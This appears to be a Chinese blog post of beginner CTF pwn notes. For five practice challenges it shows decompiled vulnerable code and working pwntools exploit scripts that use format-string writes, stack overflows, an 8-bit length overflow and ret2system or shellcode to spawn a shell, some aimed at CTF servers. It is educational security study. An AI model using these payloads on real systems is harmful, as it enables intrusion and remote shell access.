---
title: 新手pwn练习汇总
date: 2020-06-12 12:39:50
tags: 
- bin
categories:
- CTF
---

# string：

- 格式化字符串漏洞
- x64传参规则

## 抄来的原理

原理挺底层的，得认真看看
https://blog.csdn.net/qq_43394612/article/details/84900668


```cpp
    puts("A voice heard in your mind");
    puts("'Give me an address'");
    _isoc99_scanf("%ld", &address);//利用这个传一个地址进去
    puts("And, you wish is:");
    _isoc99_scanf("%s", &format); 
    puts("Your wish is");
    printf(&format); //存在格式化字符串漏洞 可以改变地址内的值
    puts("I hear it, I hear it....");
```

## exp：
```python
from pwn import *
context.arch='amd64' # 明确程序类型不同系统生成的shellcraft.sh()不同
io = process('./string')

io.recvuntil("secret[0] is ")
addr = int(io.recvuntil("\n")[:-1], 16)# 接收屏幕打印出来的地址

io.sendlineafter(" character's name be:",'cxk')
io.sendlineafter(" go?east or up?:",'east')
io.sendlineafter("go into there(1), or leave(0)?:",'1')
io.sendlineafter("'Give me an address'", str(int(addr)))# 将地址放入栈内

io.sendlineafter("you wish is:","%85c%7$n")
# 改变地址指向的值（即改第8个参数）

shellcode = asm(shellcraft.sh())# 将shellcode转成机械码
io.sendlineafter("USE YOU SPELL", shellcode)
io.interactive()
```
`85c%7$n`是改参数的其中一种方法

# CGfsb：
- 格式化字符串漏洞
- x86传参规则

```cpp
  memset(&s, 0, 0x64u);
  puts("please tell me your name:");
  read(0, &buf, 10u);
  puts("leave your message please:");
  fgets(&s, 100, stdin);
  printf("hello %s", &buf);//利用这个把 pwnme pwn掉
  puts("your message is:");
  printf(&s);
  if ( pwnme == 8 )
  {
    puts("you pwned me, here is your flag:\n");
    system("cat flag");
  }
```
## 错误的exp

```py
add = 0x0804A068

io.recvuntil("please tell me your name:")
payload = p32(add)

io.sendline(payload)

io.recvuntil("leave your message please:")

io.sendline(b'%8c%2$n')

io.interactive()
```
printf(a)才能用

## 正确的exp
```python
from pwn import *


io = remote("220.249.52.133",35348)
add = 0x0804A068

io.recvuntil("please tell me your name:")
io.sendline('cxk')

io.recvuntil("leave your message please:")

io.sendline(p32(0x0804A068) + b'%c%10$n')
# 调试一下可以看到这里的数据被原封不动放到了 esp 后面，按照 x86 的规律数一下可以看到 0x0804A068 在第十个参数的位置 ，在这里 p32(0x0804A068) 已经占了4个用于输出的位置还需要4个输出字符才能够将地址指向的参数pwn_me改成8
io.interactive()
```

# cgpwn2

构造payload打`return gets(&s);`

返回函数覆盖为

## exp:
```python
from pwn import *

r = remote("220.249.52.133", 59988)

system=0x08048420
r.recvuntil('name')
r.sendline("/bin/sh")
name=0x0804A080
payload = b'a' * (0x26+4) + p32(system)+p32(0)+p32(0x0804A080)
# 因为32位函数和参数中间是system的 返回地址用 p32(0)填充
r.sendline(payload)
#print(r.recv())

#print(r.recv())
r.interactive()

# 0804A024 /bin/sh
# 08048320 system
```
# int_overflow

- 利用小整型（int8）溢出绕过检测点
- 栈溢出改变程序流程

```cpp
char *__cdecl check_passwd(char *str)
{
  char *result; // eax
  char dest; // [esp+4h] [ebp-14h]
  unsigned __int8 v3; // [esp+Fh] [ebp-9h]

  v3 = strlen(str);//v3大于255后溢出
  if ( v3 <= 3u || v3 > 8u )
  {
    puts("Invalid Password");
    result = (char *)fflush(stdout);
  }
  else
  {
    puts("Success");
    fflush(stdout);
    result = strcpy(&dest, str);//覆盖dest 后的r
  }
  return result;
```
## exp：
```python
from pwn import *
#设置目标机的信息，用来建立远程链接，url或ip指明了主机，port设置端口
r = remote("220.249.52.133", 33284)
system=0x0804868B

r.sendlineafter("Your choice:", "1")

r.sendlineafter("your username:", "kk")

r.recvuntil("your passwd:")
payload = b'a' * (0x14+4) + p32(system) + 231*b'a'
#payload=payload.ljust(259,b'a')
print(len(payload))
r.sendline(payload)

r.recv()

r.interactive()
```

# rip

- 栈溢出
- 玄学问题

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+1h] [rbp-Fh]

  puts("please input");
  gets((__int64)&s, (__int64)argv);//打这里
  puts(&s);
  puts("ok,bye!!!");
  return 0;
}
```

中间会碰到一个玄学的问题:
http://blog.eonew.cn/archives/958
> 把源存储器内容值送入目的寄存器,当有m128时, 内存地址必须是16字节对齐的。
> XMMWORD旨在表示与m128相同的类型,刚好这里符合第二条。

就是说payload会导致栈的地址可以不是按0x10对齐的，会导致程序crash掉
这时改变payload的长度是解决方法之一
> 直接更改我们的payload长度，在栈溢出的时候栈的地址自然不同，然后将栈地址+1，如果不行的话，就继续增加，最多也就改16次就一定会遇到栈对齐的情况。
## exp
```python
from pwn import*
sh=remote("node3.buuoj.cn",28364)
payload=b'a'*23+p64(0x401016)+p64(0x401186)
sh.sendline(payload)
sh.interactive()
```
